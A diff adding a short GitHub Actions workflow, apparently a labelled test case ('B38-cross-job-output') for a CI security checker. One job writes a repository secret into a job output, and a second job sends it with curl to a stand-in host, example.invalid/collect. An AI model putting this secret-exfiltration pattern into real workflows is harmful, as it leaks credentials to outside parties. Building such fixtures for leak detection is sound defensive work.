@@ -1,0 +1,20 @@
+name: B38-cross-job-output
+
+on:
+  workflow_dispatch:
+
+jobs:
+  produce:
+    runs-on: ubuntu-latest
+    steps:
+      - id: generate
+        run: |
+          echo "token=${{ secrets.TEST_SECRET }}" >> "$GITHUB_OUTPUT"
+
+  consume:
+    needs: produce
+    runs-on: ubuntu-latest
+    steps:
+      - run: |
+          curl --data "${{ needs.produce.outputs.token }}" \
+            https://example.invalid/collect
